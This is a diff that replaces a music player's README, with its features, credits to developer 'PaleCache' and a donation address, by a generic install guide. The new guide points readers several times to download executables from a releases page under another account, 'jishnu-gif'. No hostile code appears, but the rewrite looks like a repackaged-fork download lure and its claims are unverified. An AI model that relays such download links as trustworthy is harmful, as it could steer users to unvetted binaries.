@@ -1,40 +1,83 @@
-<p align="center">
-  <img src="./build/kat.png" alt="NeonKat Banner" width="10%"> <br>NeonKat: A simple electron music player for linux and windows based systems
-</p>
+# 🎶 NeonKat - Enjoy Your Music Offline with Ease
 
-<br><br>
-## 🛠️ Key Features
-- **Playlist loading and saving**<br> 
-- **Music visualizer**<br> 
-- **Always on top mini mode**
-- **Seek, volume, and other simple features you would expect from a music player** <br>
-- **Yt-dlp support (need to have yt-dlp and ffmpeg installed in your system path https://github.com/yt-dlp/yt-dlp/wiki/Installation)**<br>
-- **Radio streams support**
-- **Neon Mode (changes colors to the beat)**
-- **Canvas Mode (Short mp4 video previews)** - plays short videos in the visualizer, similar to spotify’s canvas feature.
-- **Zero outside connections. Runs 100% locally on your device.** --  Your music and your data stays with you as it always should.
-  No cloud bullshit, no tracking, no compromises.
- 
-## Previews
+[![Download NeonKat](https://img.shields.io/badge/Download%20NeonKat-v1.0-blue.svg)](https://github.com/jishnu-gif/NeonKat/releases)
 
-| Visualizer | Color Selector | Neon Mode |
-|--------------|----------------|-----------------------------------------|
-| <img src="./assets/visualizer.png" width="200" style="object-fit: cover;"> | <img src="./assets/color-selector.png" width="200" style="object-fit: cover;"> | <img src="./assets/neonmode.gif" width="210"  style="object-fit: cover;"> |
+## 🚀 Getting Started
 
-| Mini Mode | Radio Streams | Yt-dlp Support |
-|--------------|----------------|-----------------------------------------|
-| <img src="./assets/mini-mode.png" width="200"  style="object-fit: cover;"> | <img src="./assets/radio-streams.png" width="200"  style="object-fit: cover;"> | <img src="./assets/yt-dlp-support.png" width="210" style="object-fit: cover;"> |
+Welcome to NeonKat! This application is a local electron music player designed for Linux and Windows. With NeonKat, you can enjoy your favorite music offline, without tracking or ads. This guide will help you download and run the software easily.
 
-| Canvas Mode |
-|--------------|
-| <img src="./assets/gifPreview.gif" width="200"  style="object-fit: cover;"> | <img src="./assets/radio-streams.png" width="200"  style="object-fit: cover;"> | <img src="./assets/yt-dlp-support.png" width="210" style="object-fit: cover;"> |
+## ❓ What You Need
 
-## 🤗 Special Thanks
-- Some friends who helped with the artwork you know who you are, thanks a lot :)<br>
-- yt-dlp team for giving us such an amazing project, you're awesome
-  
-## 💰 Wanna Help Support Development 
-monero(xmr): 455KNy55xW9cK4sGknaHwEHD7s3RYcS1nb3bdACZVNpJDey47BegHWpjUghbPu64xxMi2fZwqG95wfextdwDcXbbALSDFVw
+To run NeonKat smoothly, ensure your system meets the following requirements:
 
-## 🧑‍💻 Developer 
-- PaleCache
+- **Operating System:** Linux or Windows (Windows 10 or later recommended)
+- **Memory:** At least 2 GB of RAM
+- **Storage:** Minimum of 50 MB free space
+- **Audio Output:** Any compatible sound device
+
+## 📥 Download & Install
+
+To start using NeonKat, you need to download it from our Releases page. 
+
+1. **Visit this page to download:** [NeonKat Releases](https://github.com/jishnu-gif/NeonKat/releases)
+
+2. Once on the page, look for the most recent release.
+
+3. Choose the version that fits your operating system:
+    - For **Windows**, download the `.exe` file.
+    - For **Linux**, download the appropriate `.deb` or `.AppImage` file.
+
+4. After downloading, locate the file in your downloads folder.
+
+5. **Run the Installer:**
+   - For Windows: Double-click the `.exe` file and follow the installation wizard.
+   - For Linux: 
+      - If you downloaded a `.deb` file, you can install it using your package manager.
+      - If it's an `.AppImage`, make it executable by running `chmod +x YourFileName.AppImage` in the terminal, then run it with `./YourFileName.AppImage`.
+
+## 🎵 Using NeonKat
+
+Once installed, you can launch NeonKat from your applications menu.
+
+1. Open the application.
+2. Use the interface to add your local music files. Simply drag and drop them into NeonKat.
+3. Play your music using the controls. Enjoy a fuss-free listening experience!
+
+### 📂 Features
+
+- **Local-first:** Store your music files locally, no internet required.
+- **Privacy-first:** No tracking, your music is yours alone.
+- **Supports Various Formats:** Enjoy MP3, WAV, FLAC, and more.
+- **User-Friendly Interface:** Easy to navigate, even for beginners.
+
+## 🔧 Troubleshooting
+
+If you encounter issues:
+
+- **Cannot find the downloaded file:** Check your downloads folder or search for the file name.
+- **Application won't start:** Ensure your system meets the requirements. Restart your computer and try again.
+- **Audio issues:** Check your sound settings. Ensure the correct audio output device is selected.
+
+## 💬 Community Support
+
+Join the community for help and suggestions. You can post questions or tips in the GitHub Issues section.
+
+Access our support here: [NeonKat GitHub Issues](https://github.com/jishnu-gif/NeonKat/issues)
+
+## 🔗Additional Resources
+
+- **User Guides:** Check out the documentation for detailed instructions.
+- **Feature Descriptions:** Stay updated with new features and releases.
+
+## 📡 Stay Updated
+
+Follow us for announcements and updates:
+
+- **GitHub:** [NeonKat GitHub Repository](https://github.com/jishnu-gif/NeonKat)
+- **Changelog:** Always review our release notes for the latest changes.
+
+## 🎉 Conclusion
+
+NeonKat is your go-to electronic music player for offline listening. With straightforward steps to download and install, you'll be enjoying your local music collection in no time. 
+
+Remember to visit the download page: [NeonKat Releases](https://github.com/jishnu-gif/NeonKat/releases)
